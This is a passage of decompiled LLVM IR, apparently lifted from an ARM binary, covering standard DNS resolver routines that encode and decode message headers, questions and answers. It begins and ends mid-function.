  uselistorder i32 (i8*, i32)* @__GI_memset, { 1, 2, 18, 23, 24, 19, 31, 29, 25, 30, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 21, 22, 28, 26, 27 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b244, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b22c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b1d4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1b120, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1b0d8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b0d4, { 1, 0 }
  uselistorder label %dec_label_pc_1b08c, { 1, 0 }
  uselistorder label %dec_label_pc_1b060, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1b25c = load i32, i32* @r4, align 4
  store i32 %v3_1b25c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1b26c = icmp sgt i32 %arg3, 11
  br i1 %v7_1b26c, label %dec_label_pc_1b270, label %dec_label_pc_1b338

dec_label_pc_1b270:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_1b270 = add i32 %tmp, 1
  %v2_1b270 = inttoptr i32 %v1_1b270 to i8*
  %v3_1b270 = load i8, i8* %v2_1b270, align 1
  store i8 %v3_1b270, i8* %tmp18, align 1
  %v2_1b278 = load i32, i32* %arg1, align 4
  %v1_1b27c = trunc i32 %v2_1b278 to i8
  %v4_1b27c = add i32 %arg2, 1
  %v5_1b27c = inttoptr i32 %v4_1b27c to i8*
  store i8 %v1_1b27c, i8* %v5_1b27c, align 1
  %v0_1b280 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b280 = add i32 %v0_1b280, 12
  %v2_1b280 = inttoptr i32 %v1_1b280 to i32*
  %v3_1b280 = load i32, i32* %v2_1b280, align 4
  %v1_1b284 = add i32 %v0_1b280, 4
  %v2_1b284 = inttoptr i32 %v1_1b284 to i32*
  %v3_1b284 = load i32, i32* %v2_1b284, align 4
  %v1_1b288 = add i32 %v0_1b280, 16
  %v2_1b288 = inttoptr i32 %v1_1b288 to i32*
  %v3_1b288 = load i32, i32* %v2_1b288, align 4
  %v1_1b28c = add i32 %tmp, 8
  %v2_1b28c = inttoptr i32 %v1_1b28c to i32*
  %v3_1b28c = load i32, i32* %v2_1b28c, align 4
  %v2_1b290 = icmp eq i32 %v3_1b280, 0
  %. = select i1 %v2_1b290, i32 0, i32 4
  %v2_1b29c = icmp eq i32 %v3_1b284, 0
  %v1_1b2a0 = add i32 %v0_1b280, 20
  %v2_1b2a0 = inttoptr i32 %v1_1b2a0 to i32*
  %v3_1b2a0 = load i32, i32* %v2_1b2a0, align 4
  %storemerge12 = select i1 %v2_1b29c, i32 0, i32 128
  %v1_1b2ac = urem i32 %v3_1b28c, 16
  %v2_1b2b0 = icmp eq i32 %v3_1b288, 0
  %.29 = select i1 %v2_1b2b0, i32 0, i32 2
  %v4_1b2bc = mul nuw nsw i32 %v1_1b2ac, 8
  %v5_1b2bc = or i32 %v4_1b2bc, %.
  %v2_1b2c0 = icmp eq i32 %v3_1b2a0, 0
  br i1 %v2_1b2c0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1b270
  %v2_1b2c4 = or i32 %v5_1b2bc, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1b270, %bb25
  %v1_1b2cc = phi i32 [ %v5_1b2bc, %dec_label_pc_1b270 ], [ %v2_1b2c4, %bb25 ]
  %v2_1b2c8 = or i32 %.29, %storemerge12
  %v2_1b2cc = or i32 %v2_1b2c8, %v1_1b2cc
  %v1_1b2d0 = trunc i32 %v2_1b2cc to i8
  %v2_1b2d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b2d0 = add i32 %v2_1b2d0, 2
  %v4_1b2d0 = inttoptr i32 %v3_1b2d0 to i8*
  store i8 %v1_1b2d0, i8* %v4_1b2d0, align 1
  %v0_1b2d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b2d4 = add i32 %v0_1b2d4, 24
  %v1_1b2d8 = inttoptr i32 %v1_1b2d4 to i32*
  %v2_1b2d8 = load i32, i32* %v1_1b2d8, align 4
  %v3_1b2d8 = add i32 %v0_1b2d4, 28
  %v4_1b2d8 = inttoptr i32 %v3_1b2d8 to i32*
  %v5_1b2d8 = load i32, i32* %v4_1b2d8, align 4
  %v2_1b2dc = icmp eq i32 %v2_1b2d8, 0
  %v1_1b2e0 = urem i32 %v5_1b2d8, 16
  %.30 = select i1 %v2_1b2dc, i32 0, i32 128
  %v2_1b2ec = or i32 %v1_1b2e0, %.30
  %v1_1b2f0 = trunc i32 %v2_1b2ec to i8
  %v2_1b2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b2f0 = add i32 %v2_1b2f0, 3
  %v4_1b2f0 = inttoptr i32 %v3_1b2f0 to i8*
  store i8 %v1_1b2f0, i8* %v4_1b2f0, align 1
  %v0_1b2f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b2f4 = add i32 %v0_1b2f4, 33
  %v2_1b2f4 = inttoptr i32 %v1_1b2f4 to i8*
  %v3_1b2f4 = load i8, i8* %v2_1b2f4, align 1
  %v2_1b2f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b2f8 = add i32 %v2_1b2f8, 4
  %v4_1b2f8 = inttoptr i32 %v3_1b2f8 to i8*
  store i8 %v3_1b2f4, i8* %v4_1b2f8, align 1
  %v0_1b2fc = load i32, i32* %lr.global-to-local, align 4
  %v1_1b2fc = add i32 %v0_1b2fc, 32
  %v2_1b2fc = inttoptr i32 %v1_1b2fc to i32*
  %v3_1b2fc = load i32, i32* %v2_1b2fc, align 4
  %v1_1b300 = trunc i32 %v3_1b2fc to i8
  %v2_1b300 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b300 = add i32 %v2_1b300, 5
  %v4_1b300 = inttoptr i32 %v3_1b300 to i8*
  store i8 %v1_1b300, i8* %v4_1b300, align 1
  %v0_1b304 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b304 = add i32 %v0_1b304, 37
  %v2_1b304 = inttoptr i32 %v1_1b304 to i8*
  %v3_1b304 = load i8, i8* %v2_1b304, align 1
  %v2_1b308 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b308 = add i32 %v2_1b308, 6
  %v4_1b308 = inttoptr i32 %v3_1b308 to i8*
  store i8 %v3_1b304, i8* %v4_1b308, align 1
  %v0_1b30c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b30c = add i32 %v0_1b30c, 36
  %v2_1b30c = inttoptr i32 %v1_1b30c to i32*
  %v3_1b30c = load i32, i32* %v2_1b30c, align 4
  %v1_1b310 = trunc i32 %v3_1b30c to i8
  %v2_1b310 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b310 = add i32 %v2_1b310, 7
  %v4_1b310 = inttoptr i32 %v3_1b310 to i8*
  store i8 %v1_1b310, i8* %v4_1b310, align 1
  %v0_1b314 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b314 = add i32 %v0_1b314, 41
  %v2_1b314 = inttoptr i32 %v1_1b314 to i8*
  %v3_1b314 = load i8, i8* %v2_1b314, align 1
  %v2_1b318 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b318 = add i32 %v2_1b318, 8
  %v4_1b318 = inttoptr i32 %v3_1b318 to i8*
  store i8 %v3_1b314, i8* %v4_1b318, align 1
  %v0_1b31c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b31c = add i32 %v0_1b31c, 40
  %v2_1b31c = inttoptr i32 %v1_1b31c to i32*
  %v3_1b31c = load i32, i32* %v2_1b31c, align 4
  %v1_1b320 = trunc i32 %v3_1b31c to i8
  %v2_1b320 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b320 = add i32 %v2_1b320, 9
  %v4_1b320 = inttoptr i32 %v3_1b320 to i8*
  store i8 %v1_1b320, i8* %v4_1b320, align 1
  %v0_1b324 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b324 = add i32 %v0_1b324, 45
  %v2_1b324 = inttoptr i32 %v1_1b324 to i8*
  %v3_1b324 = load i8, i8* %v2_1b324, align 1
  %v2_1b328 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b328 = add i32 %v2_1b328, 10
  %v4_1b328 = inttoptr i32 %v3_1b328 to i8*
  store i8 %v3_1b324, i8* %v4_1b328, align 1
  %v0_1b32c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b32c = add i32 %v0_1b32c, 44
  %v2_1b32c = inttoptr i32 %v1_1b32c to i32*
  %v3_1b32c = load i32, i32* %v2_1b32c, align 4
  %v1_1b330 = trunc i32 %v3_1b32c to i8
  %v2_1b330 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b330 = add i32 %v2_1b330, 11
  %v4_1b330 = inttoptr i32 %v3_1b330 to i8*
  store i8 %v1_1b330, i8* %v4_1b330, align 1
  %v2_1b33c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b338

dec_label_pc_1b338:                               ; preds = %entry, %bb26
  %v2_1b33c = phi i32 [ %v3_1b25c, %entry ], [ %v2_1b33c.pre, %bb26 ]
  %v0_1b338 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1b33c, i32* @r4, align 4
  ret i32 %v0_1b338

; uselistorder directives
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b338, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1b340 = load i8, i8* %arg1, align 1
  %v4_1b340 = zext i8 %v3_1b340 to i32
  %v2_1b344 = add i32 %tmp, 1
  %v3_1b344 = inttoptr i32 %v2_1b344 to i8*
  %v4_1b344 = load i8, i8* %v3_1b344, align 1
  %v5_1b344 = zext i8 %v4_1b344 to i32
  %v4_1b348 = mul nuw nsw i32 %v4_1b340, 256
  %v5_1b348 = or i32 %v5_1b344, %v4_1b348
  %v2_1b34c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1b348, i32* %v2_1b34c, align 4
  %v2_1b350 = add i32 %tmp, 2
  %v3_1b350 = inttoptr i32 %v2_1b350 to i8*
  %v4_1b350 = load i8, i8* %v3_1b350, align 1
  %tmp4 = icmp slt i8 %v4_1b350, 0
  %v3_1b354 = zext i1 %tmp4 to i32
  %v2_1b358 = add i32 %arg2, 4
  %v3_1b358 = inttoptr i32 %v2_1b358 to i32*
  store i32 %v3_1b354, i32* %v3_1b358, align 4
  %v4_1b35c = load i8, i8* %v3_1b350, align 1
  %div = udiv i8 %v4_1b35c, 8
  %tmp5 = urem i8 %div, 16
  %v1_1b364 = zext i8 %tmp5 to i32
  %v2_1b368 = add i32 %arg2, 8
  %v3_1b368 = inttoptr i32 %v2_1b368 to i32*
  store i32 %v1_1b364, i32* %v3_1b368, align 4
  %v4_1b36c = load i8, i8* %v3_1b350, align 1
  %div1 = udiv i8 %v4_1b36c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1b374 = zext i8 %tmp6 to i32
  %v2_1b378 = add i32 %arg2, 12
  %v3_1b378 = inttoptr i32 %v2_1b378 to i32*
  store i32 %v1_1b374, i32* %v3_1b378, align 4
  %v4_1b37c = load i8, i8* %v3_1b350, align 1
  %div2 = udiv i8 %v4_1b37c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1b384 = zext i8 %tmp7 to i32
  %v2_1b388 = add i32 %arg2, 16
  %v3_1b388 = inttoptr i32 %v2_1b388 to i32*
  store i32 %v1_1b384, i32* %v3_1b388, align 4
  %v4_1b38c = load i8, i8* %v3_1b350, align 1
  %tmp8 = urem i8 %v4_1b38c, 2
  %v1_1b390 = zext i8 %tmp8 to i32
  %v2_1b394 = add i32 %arg2, 20
  %v3_1b394 = inttoptr i32 %v2_1b394 to i32*
  store i32 %v1_1b390, i32* %v3_1b394, align 4
  %v2_1b398 = add i32 %tmp, 3
  %v3_1b398 = inttoptr i32 %v2_1b398 to i8*
  %v4_1b398 = load i8, i8* %v3_1b398, align 1
  %tmp9 = icmp slt i8 %v4_1b398, 0
  %v3_1b39c = zext i1 %tmp9 to i32
  %v2_1b3a0 = add i32 %arg2, 24
  %v3_1b3a0 = inttoptr i32 %v2_1b3a0 to i32*
  store i32 %v3_1b39c, i32* %v3_1b3a0, align 4
  %v4_1b3a4 = load i8, i8* %v3_1b398, align 1
  %tmp10 = urem i8 %v4_1b3a4, 16
  %v1_1b3a8 = zext i8 %tmp10 to i32
  %v2_1b3ac = add i32 %arg2, 28
  %v3_1b3ac = inttoptr i32 %v2_1b3ac to i32*
  store i32 %v1_1b3a8, i32* %v3_1b3ac, align 4
  %v2_1b3b0 = add i32 %tmp, 4
  %v3_1b3b0 = inttoptr i32 %v2_1b3b0 to i8*
  %v4_1b3b0 = load i8, i8* %v3_1b3b0, align 1
  %v5_1b3b0 = zext i8 %v4_1b3b0 to i32
  %v2_1b3b4 = add i32 %tmp, 5
  %v3_1b3b4 = inttoptr i32 %v2_1b3b4 to i8*
  %v4_1b3b4 = load i8, i8* %v3_1b3b4, align 1
  %v5_1b3b4 = zext i8 %v4_1b3b4 to i32
  %v4_1b3b8 = mul nuw nsw i32 %v5_1b3b0, 256
  %v5_1b3b8 = or i32 %v5_1b3b4, %v4_1b3b8
  %v2_1b3bc = add i32 %arg2, 32
  %v3_1b3bc = inttoptr i32 %v2_1b3bc to i32*
  store i32 %v5_1b3b8, i32* %v3_1b3bc, align 4
  %v2_1b3c0 = add i32 %tmp, 6
  %v3_1b3c0 = inttoptr i32 %v2_1b3c0 to i8*
  %v4_1b3c0 = load i8, i8* %v3_1b3c0, align 1
  %v5_1b3c0 = zext i8 %v4_1b3c0 to i32
  %v2_1b3c4 = add i32 %tmp, 7
  %v3_1b3c4 = inttoptr i32 %v2_1b3c4 to i8*
  %v4_1b3c4 = load i8, i8* %v3_1b3c4, align 1
  %v5_1b3c4 = zext i8 %v4_1b3c4 to i32
  %v4_1b3c8 = mul nuw nsw i32 %v5_1b3c0, 256
  %v5_1b3c8 = or i32 %v5_1b3c4, %v4_1b3c8
  %v2_1b3cc = add i32 %arg2, 36
  %v3_1b3cc = inttoptr i32 %v2_1b3cc to i32*
  store i32 %v5_1b3c8, i32* %v3_1b3cc, align 4
  %v2_1b3d0 = add i32 %tmp, 8
  %v3_1b3d0 = inttoptr i32 %v2_1b3d0 to i8*
  %v4_1b3d0 = load i8, i8* %v3_1b3d0, align 1
  %v5_1b3d0 = zext i8 %v4_1b3d0 to i32
  %v2_1b3d4 = add i32 %tmp, 9
  %v3_1b3d4 = inttoptr i32 %v2_1b3d4 to i8*
  %v4_1b3d4 = load i8, i8* %v3_1b3d4, align 1
  %v5_1b3d4 = zext i8 %v4_1b3d4 to i32
  %v4_1b3d8 = mul nuw nsw i32 %v5_1b3d0, 256
  %v5_1b3d8 = or i32 %v5_1b3d4, %v4_1b3d8
  %v2_1b3dc = add i32 %arg2, 40
  %v3_1b3dc = inttoptr i32 %v2_1b3dc to i32*
  store i32 %v5_1b3d8, i32* %v3_1b3dc, align 4
  %v2_1b3e0 = add i32 %tmp, 11
  %v3_1b3e0 = inttoptr i32 %v2_1b3e0 to i8*
  %v4_1b3e0 = load i8, i8* %v3_1b3e0, align 1
  %v5_1b3e0 = zext i8 %v4_1b3e0 to i32
  %v2_1b3e4 = add i32 %tmp, 10
  %v3_1b3e4 = inttoptr i32 %v2_1b3e4 to i8*
  %v4_1b3e4 = load i8, i8* %v3_1b3e4, align 1
  %v5_1b3e4 = zext i8 %v4_1b3e4 to i32
  %v4_1b3ec = mul nuw nsw i32 %v5_1b3e4, 256
  %v5_1b3ec = or i32 %v4_1b3ec, %v5_1b3e0
  %v2_1b3f0 = add i32 %arg2, 44
  %v3_1b3f0 = inttoptr i32 %v2_1b3f0 to i32*
  store i32 %v5_1b3ec, i32* %v3_1b3f0, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 19, 20, 6, 9, 10, 11, 21, 4, 5, 22, 23, 24, 25, 26, 0, 12, 13, 14, 7, 15, 16, 8, 3, 2, 1, 17, 18 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b3f8 = load i32, i32* @r4, align 4
  store i32 %v3_1b3f8, i32* %stack_var_-16, align 4
  %v6_1b3f8 = load i32, i32* @r5, align 4
  %v9_1b3f8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1b400 = load i32, i32* %arg1, align 4
  store i32 %v2_1b400, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1b40c = inttoptr i32 %v2_1b400 to i8*
  %v2_1b40c = call i32 @__encode_dotted(i8* %v1_1b40c)
  store i32 %v2_1b40c, i32* %r0.global-to-local, align 4
  %v1_1b410 = icmp slt i32 %v2_1b40c, 0
  br i1 %v1_1b410, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1b418 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1b418, i32* @r4, align 4
  store i32 %v6_1b3f8, i32* @r5, align 4
  store i32 %v9_1b3f8, i32* @r6, align 4
  ret i32 %v2_1b40c

bb6:                                              ; preds = %entry
  %v1_1b414 = load i32, i32* @r4, align 4
  %v2_1b414 = sub i32 %v1_1b414, %v2_1b40c
  %v0_1b420 = load i32, i32* @r6, align 4
  %v2_1b420 = add i32 %v0_1b420, %v2_1b40c
  store i32 %v2_1b420, i32* %r2.global-to-local, align 4
  %v7_1b424 = icmp sgt i32 %v2_1b414, 3
  br i1 %v7_1b424, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1b428 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1b428, i32* @r4, align 4
  store i32 %v6_1b3f8, i32* @r5, align 4
  store i32 %v9_1b3f8, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1b42c = load i32, i32* @r5, align 4
  %v1_1b42c = add i32 %v0_1b42c, 5
  %v2_1b42c = inttoptr i32 %v1_1b42c to i8*
  %v3_1b42c = load i8, i8* %v2_1b42c, align 1
  %v5_1b430 = inttoptr i32 %v2_1b420 to i8*
  store i8 %v3_1b42c, i8* %v5_1b430, align 1
  %v0_1b434 = load i32, i32* @r5, align 4
  %v1_1b434 = add i32 %v0_1b434, 4
  %v2_1b434 = inttoptr i32 %v1_1b434 to i32*
  %v3_1b434 = load i32, i32* %v2_1b434, align 4
  %v1_1b438 = trunc i32 %v3_1b434 to i8
  %v2_1b438 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b438 = add i32 %v2_1b438, 1
  %v4_1b438 = inttoptr i32 %v3_1b438 to i8*
  store i8 %v1_1b438, i8* %v4_1b438, align 1
  %v0_1b43c = load i32, i32* @r5, align 4
  %v1_1b43c = add i32 %v0_1b43c, 9
  %v2_1b43c = inttoptr i32 %v1_1b43c to i8*
  %v3_1b43c = load i8, i8* %v2_1b43c, align 1
  %v2_1b440 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b440 = add i32 %v2_1b440, 2
  %v4_1b440 = inttoptr i32 %v3_1b440 to i8*
  store i8 %v3_1b43c, i8* %v4_1b440, align 1
  %v0_1b444 = load i32, i32* @r5, align 4
  %v1_1b444 = add i32 %v0_1b444, 8
  %v2_1b444 = inttoptr i32 %v1_1b444 to i32*
  %v3_1b444 = load i32, i32* %v2_1b444, align 4
  %v0_1b448 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b448 = add i32 %v0_1b448, 4
  store i32 %v1_1b448, i32* %r0.global-to-local, align 4
  %v1_1b44c = trunc i32 %v3_1b444 to i8
  %v2_1b44c = load i32, i32* %r2.global-to-local, align 4
  %v3_1b44c = add i32 %v2_1b44c, 3
  %v4_1b44c = inttoptr i32 %v3_1b44c to i8*
  store i8 %v1_1b44c, i8* %v4_1b44c, align 1
  %v2_1b450 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b450, i32* @r4, align 4
  store i32 %v6_1b3f8, i32* @r5, align 4
  store i32 %v9_1b3f8, i32* @r6, align 4
  ret i32 %v1_1b448

; uselistorder directives
  uselistorder i32 %v2_1b40c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1b3f8, { 1, 0, 2 }
  uselistorder i32 %v6_1b3f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1b458 = call i32 @__length_dotted()
  %v1_1b45c = icmp slt i32 %v0_1b458, 0
  br i1 %v1_1b45c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1b460 = add i32 %v0_1b458, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1b464 = phi i32 [ %v0_1b458, %entry ], [ %v4_1b460, %bb ]
  ret i32 %v5_1b464

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1b468 = load i32, i32* @r4, align 4
  %v6_1b468 = load i32, i32* @r5, align 4
  %v9_1b468 = load i32, i32* @r6, align 4
  %v12_1b468 = load i32, i32* @r7, align 4
  %v21_1b468 = load i32, i32* @sl, align 4
  %v2_1b46c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1b46c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1b488 = call i32 @__decode_dotted()
  store i32 %v0_1b488, i32* %r0.global-to-local, align 4
  store i32 %v0_1b488, i32* @r7, align 4
  %v1_1b48c = icmp slt i32 %v0_1b488, 0
  %v0_1b490 = load i32, i32* @r4, align 4
  %v2_1b490 = add i32 %v0_1b490, %v0_1b488
  store i32 %v2_1b490, i32* %r8.global-to-local, align 4
  br i1 %v1_1b48c, label %bb14, label %dec_label_pc_1b4a0

dec_label_pc_1b4a0:                               ; preds = %entry
  %v1_1b498 = load i32, i32* @r5, align 4
  %v2_1b498 = sub i32 %v1_1b498, %v2_1b490
  %v1_1b4a0 = add i32 %v2_1b498, -10
  store i32 %v1_1b4a0, i32* @r5, align 4
  %v6_1b4a0 = icmp slt i32 %v1_1b4a0, 0
  store i32 %v2_1b46c, i32* %r0.global-to-local, align 4
  %v0_1b4a8 = load i32, i32* @sl, align 4
  %v2_1b4a8 = add i32 %v0_1b4a8, %v2_1b490
  store i32 %v2_1b4a8, i32* @r4, align 4
  br i1 %v6_1b4a0, label %bb, label %dec_label_pc_1b4b4

bb:                                               ; preds = %dec_label_pc_1b4a0
  br label %bb14

dec_label_pc_1b4b4:                               ; preds = %dec_label_pc_1b4a0
  %v1_1b4b4 = bitcast i32* %stack_var_-288 to i8*
  %v2_1b4b4 = call i32 @__GI_strdup(i8* %v1_1b4b4)
  store i32 %v2_1b4b4, i32* %r0.global-to-local, align 4
  %v1_1b4b8 = load i32, i32* @r6, align 4
  %v2_1b4b8 = inttoptr i32 %v1_1b4b8 to i32*
  store i32 %v2_1b4b4, i32* %v2_1b4b8, align 4
  %v0_1b4bc = load i32, i32* @sl, align 4
  %v1_1b4bc = load i32, i32* %r8.global-to-local, align 4
  %v2_1b4bc = add i32 %v1_1b4bc, %v0_1b4bc
  %v3_1b4bc = inttoptr i32 %v2_1b4bc to i8*
  %v4_1b4bc = load i8, i8* %v3_1b4bc, align 1
  %v6_1b4bc = zext i8 %v4_1b4bc to i32
  %v0_1b4c0 = load i32, i32* @r4, align 4
  %v1_1b4c0 = add i32 %v0_1b4c0, 1
  %v2_1b4c0 = inttoptr i32 %v1_1b4c0 to i8*
  %v3_1b4c0 = load i8, i8* %v2_1b4c0, align 1
  %v4_1b4c0 = zext i8 %v3_1b4c0 to i32
  %v4_1b4c4 = mul nuw nsw i32 %v6_1b4bc, 256
  %v5_1b4c4 = or i32 %v4_1b4c0, %v4_1b4c4
  store i32 %v5_1b4c4, i32* %r3.global-to-local, align 4
  %v1_1b4c8 = load i32, i32* @r6, align 4
  %v2_1b4c8 = add i32 %v1_1b4c8, 4
  %v3_1b4c8 = inttoptr i32 %v2_1b4c8 to i32*
  store i32 %v5_1b4c4, i32* %v3_1b4c8, align 4
  %v0_1b4cc = load i32, i32* @r4, align 4
  %v1_1b4cc = add i32 %v0_1b4cc, 2
  store i32 %v1_1b4cc, i32* %r1.global-to-local, align 4
  %v2_1b4d0 = inttoptr i32 %v1_1b4cc to i8*
  %v3_1b4d0 = load i8, i8* %v2_1b4d0, align 1
  %v4_1b4d0 = zext i8 %v3_1b4d0 to i32
  %v1_1b4d4 = add i32 %v0_1b4cc, 3
  %v2_1b4d4 = inttoptr i32 %v1_1b4d4 to i8*
  %v3_1b4d4 = load i8, i8* %v2_1b4d4, align 1
  %v4_1b4d4 = zext i8 %v3_1b4d4 to i32
  %v4_1b4d8 = mul nuw nsw i32 %v4_1b4d0, 256
  %v5_1b4d8 = or i32 %v4_1b4d4, %v4_1b4d8
  store i32 %v5_1b4d8, i32* %r3.global-to-local, align 4
  %v1_1b4dc = load i32, i32* @r6, align 4
  %v2_1b4dc = add i32 %v1_1b4dc, 8
  %v3_1b4dc = inttoptr i32 %v2_1b4dc to i32*
  store i32 %v5_1b4d8, i32* %v3_1b4dc, align 4
  %v0_1b4e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b4e0 = add i32 %v0_1b4e0, 2
  %v1_1b4e4 = add i32 %v0_1b4e0, 3
  %v2_1b4e4 = inttoptr i32 %v1_1b4e4 to i8*
  %v3_1b4e4 = load i8, i8* %v2_1b4e4, align 1
  %v4_1b4e4 = zext i8 %v3_1b4e4 to i32
  store i32 %v4_1b4e4, i32* %r3.global-to-local, align 4
  %v2_1b4e8 = inttoptr i32 %v1_1b4e0 to i8*
  %v3_1b4e8 = load i8, i8* %v2_1b4e8, align 1
  %v4_1b4e8 = zext i8 %v3_1b4e8 to i32
  store i32 %v4_1b4e8, i32* %r0.global-to-local, align 4
  %v1_1b4ec = add i32 %v0_1b4e0, 5
  %v2_1b4ec = inttoptr i32 %v1_1b4ec to i8*
  %v3_1b4ec = load i8, i8* %v2_1b4ec, align 1
  %v4_1b4ec = zext i8 %v3_1b4ec to i32
  %v3_1b4f0 = mul nuw nsw i32 %v4_1b4e4, 65536
  store i32 %v3_1b4f0, i32* %r3.global-to-local, align 4
  %v1_1b4f4 = add i32 %v0_1b4e0, 4
  %v2_1b4f4 = inttoptr i32 %v1_1b4f4 to i8*
  %v3_1b4f4 = load i8, i8* %v2_1b4f4, align 1
  %v4_1b4f4 = zext i8 %v3_1b4f4 to i32
  %v4_1b4f8 = mul nuw i32 %v4_1b4e8, 16777216
  %v5_1b4f8 = or i32 %v4_1b4f8, %v3_1b4f0
  %v2_1b4fc = or i32 %v5_1b4f8, %v4_1b4ec
  %v4_1b500 = mul nuw nsw i32 %v4_1b4f4, 256
  %v5_1b500 = or i32 %v2_1b4fc, %v4_1b500
  store i32 %v5_1b500, i32* %r3.global-to-local, align 4
  %v1_1b504 = load i32, i32* @r6, align 4
  %v2_1b504 = add i32 %v1_1b504, 12
  %v3_1b504 = inttoptr i32 %v2_1b504 to i32*
  store i32 %v5_1b500, i32* %v3_1b504, align 4
  %v0_1b508 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b508 = add i32 %v0_1b508, 6
  %v2_1b508 = inttoptr i32 %v1_1b508 to i8*
  %v3_1b508 = load i8, i8* %v2_1b508, align 1
